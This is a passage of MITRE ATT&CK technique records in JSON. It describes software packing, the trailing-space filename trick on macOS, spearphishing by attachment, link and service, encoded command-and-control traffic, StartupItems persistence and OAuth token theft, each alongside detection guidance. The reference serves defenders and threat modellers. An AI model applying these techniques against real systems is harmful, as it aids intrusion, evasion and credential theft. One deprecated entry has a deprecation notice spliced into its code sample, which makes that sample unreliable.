[PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:43.472Z\",\"external_references\":[{\"external_id\":\"T1045\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1045\"},{\"external_id\":\"CAPEC-570\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/570.html\"},{\"description\":\"Executable compression. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Wikipedia Exe Compression\",\"url\":\"http://en.wikipedia.org/wiki/Executable_compression\"},{\"description\":\"Kafka, F. (2018, January). ESET\'s Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019.\",\"source_name\":\"ESET FinFisher Jan 2018\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf\"}],\"id\":\"attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88\",\"modified\":\"2020-02-05T14:18:21.533Z\",\"name\":\"Software Packing\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-05T14:17:46.686Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable\'s original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \\n\\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  \",\"external_references\":[{\"external_id\":\"T1027.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027/002\"},{\"external_id\":\"CAPEC-570\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/570.html\"},{\"description\":\"Kafka, F. (2018, January). ESET\'s Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019.\",\"source_name\":\"ESET FinFisher Jan 2018\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf\"},{\"description\":\"Executable compression. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Wikipedia Exe Compression\",\"url\":\"http://en.wikipedia.org/wiki/Executable_compression\"}],\"id\":\"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-02-05T20:05:41.548Z\",\"name\":\"Software Packing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Filip Kafka, ESET\"],\"x_mitre_data_sources\":[\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Heuristic detection\",\"Signature-based detection\"],\"x_mitre_detection\":\"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated and should no longer be used.**\\n\\nThe <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the \\\".\\\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell\'s environment.(Citation: Source Manual)\\n\\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.\",\"external_references\":[{\"external_id\":\"T1153\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1153\"},{\"description\":\"ss64. (n.d.). Source or Dot Operator. Retrieved May 21, 2019.\",\"source_name\":\"Source Manual\",\"url\":\"https://ss64.com/bash/source.html\"}],\"id\":\"attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-30T13:40:14.512Z\",\"name\":\"Source\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\",\"Process command-line parameters\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Monitor for command shell execution of source and subsequent processes that are started as a result of being executed by a source command. Adversaries must also drop a file to disk in order to execute it with source, and these files can also detected by file monitoring.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_remote_support\":false,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1151\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1151\"},{\"external_id\":\"CAPEC-649\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/649.html\"},{\"description\":\"Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors are suddenly back. Retrieved July 8, 2017.\",\"source_name\":\"Mac Backdoors are back\",\"url\":\"https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/\"}],\"id\":\"attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00\",\"modified\":\"2020-02-10T20:49:12.897Z\",\"name\":\"Space after Filename\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-10T20:47:10.082Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries can hide a program\'s true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\\n\\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\\n\\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.\",\"external_references\":[{\"external_id\":\"T1036.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/006\"},{\"external_id\":\"CAPEC-649\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/649.html\"},{\"description\":\"Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors are suddenly back. Retrieved July 8, 2017.\",\"source_name\":\"Mac Backdoors are back\",\"url\":\"https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/\"}],\"id\":\"attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T20:26:01.690Z\",\"name\":\"Space after Filename\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Erye Hernandez, Palo Alto Networks\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"It\'s not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user\'s perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1193\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1193\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"}],\"id\":\"attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38\",\"modified\":\"2020-03-02T19:08:17.884Z\",\"name\":\"Spearphishing Attachment\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T19:05:18.137Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may send spearphishing emails with a malicious attachment in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\\n\\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary\'s payload exploits a vulnerability or directly executes on the user\'s system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\",\"external_references\":[{\"external_id\":\"T1566.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1566/001\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"}],\"id\":\"attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-27T23:56:40.369Z\",\"name\":\"Spearphishing Attachment\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Packet capture\",\"Network intrusion detection system\",\"Detonation chamber\",\"Email gateway\",\"Mail server\"],\"x_mitre_detection\":\"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\\n\\nAnti-virus can potentially detect malicious documents and attachments as they\'re scanned to be stored on the email server or on the user\'s computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\",\"Windows\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1192\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1192\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"},{\"description\":\"Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.\",\"source_name\":\"Trend Micro Pawn Storm OAuth 2017\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks\"}],\"id\":\"attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba\",\"modified\":\"2020-03-02T19:21:35.153Z\",\"name\":\"Spearphishing Link\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T19:15:44.182Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \\n\\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)\",\"external_references\":[{\"external_id\":\"T1566.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1566/002\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"},{\"description\":\"Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.\",\"source_name\":\"Trend Micro Pawn Storm OAuth 2017\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks\"}],\"id\":\"attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-02T19:44:47.843Z\",\"name\":\"Spearphishing Link\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Shailesh Tiwary (Indian Army)\",\"Mark Wee\",\"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)\",\"Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Packet capture\",\"Web proxy\",\"Email gateway\",\"Detonation chamber\",\"SSL/TLS inspection\",\"DNS records\",\"Mail server\"],\"x_mitre_detection\":\"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they\'re potentially malicious, or wait and capture the content if a user visits the link.\\n\\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1194\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1194\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"}],\"id\":\"attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847\",\"modified\":\"2020-03-02T19:30:53.487Z\",\"name\":\"Spearphishing via Service\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T19:24:00.951Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may send spearphishing messages via third-party services in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \\n\\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target\'s interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that\'s running in an environment. The adversary can then send malicious links or attachments through these services.\\n\\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it\'s something they were expecting. If the payload doesn\'t work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.\",\"external_references\":[{\"external_id\":\"T1566.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1566/003\"},{\"external_id\":\"CAPEC-163\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/163.html\"}],\"id\":\"attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-28T00:04:46.264Z\",\"name\":\"Spearphishing via Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Anti-virus\",\"Web proxy\"],\"x_mitre_detection\":\"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user\'s computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:35.334Z\",\"external_references\":[{\"external_id\":\"T1032\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1032\"},{\"description\":\"Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.\",\"source_name\":\"SANS Decrypting SSL\",\"url\":\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\"},{\"description\":\"Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.\",\"source_name\":\"SEI SSL Inspection Risks\",\"url\":\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\"},{\"description\":\"Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.\",\"source_name\":\"Fidelis DarkComet\",\"url\":\"https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5\",\"modified\":\"2020-03-21T00:43:01.387Z\",\"name\":\"Standard Cryptographic Protocol\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-14T23:36:52.095Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.\",\"external_references\":[{\"external_id\":\"T1132.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1132/001\"},{\"description\":\"Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Binary-to-text Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\"},{\"description\":\"Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Character Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Character_encoding\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-14T23:36:52.095Z\",\"name\":\"Standard Encoding\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1165\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1165\"},{\"description\":\"Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.\",\"source_name\":\"Startup Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f\",\"modified\":\"2020-01-15T18:02:49.891Z\",\"name\":\"Startup Items\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-15T18:00:33.603Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. (Citation: Startup Items)\\n\\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \\n\\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.\",\"external_references\":[{\"external_id\":\"T1037.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037/005\"},{\"description\":\"Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.\",\"source_name\":\"Startup Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T23:47:39.124Z\",\"name\":\"Startup Items\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\\n\\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-09-04T15:54:25.684Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.\\n\\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft\'s Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \\n \\nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user\'s OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through [Spearphishing Link](https://attack.mitre.org/techniques/T1192) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1527).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\\n\\nAdversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)\",\"external_references\":[{\"external_id\":\"T1528\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1528\"},{\"description\":\"Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.\",\"source_name\":\"Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019\",\"url\":\"https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/\"},{\"description\":\"Microsoft. (n.d.). Retrieved September 12, 2019.\",\"source_name\":\"Microsoft Identity Platform Protocols May 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols\"},{\"description\":\"Microsoft. (n.d.). Microsoft identity platform and OAuth 2.0 authorization code flow. Retrieved September 12, 2019.\",\"source_name\":\"Microsoft - OAuth Code Authorization flow - June 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow\"},{\"description\":\"Microsoft. (2019, May 8). Quickstart: Register an application with the Microsoft identity platform. Retrieved September 12, 2019.\",\"source_name\":\"Microsoft - Azure AD App Registration - May 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app\"},{\"description\":\"Microsoft. (2019, August 29). Microsoft identity platform access tokens. Retrieved September 12, 2019.\",\"source_name\":\"Microsoft - Azure AD Identity Tokens - Aug 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens\"},{\"description\":\"Amnesty International. (2019, August 16). Evolving Phishing Attacks Targeting Journalists and Human Rights Defenders from the Middle-East and North Africa. Retrieved October 8, 2019.\",\"source_name\":\"Amnesty OAuth Phishing Attacks, August 2019\",\"url\":\"https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/\"},{\"description\":\"Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.\",\"source_name\":\"Trend Micro Pawn Storm OAuth 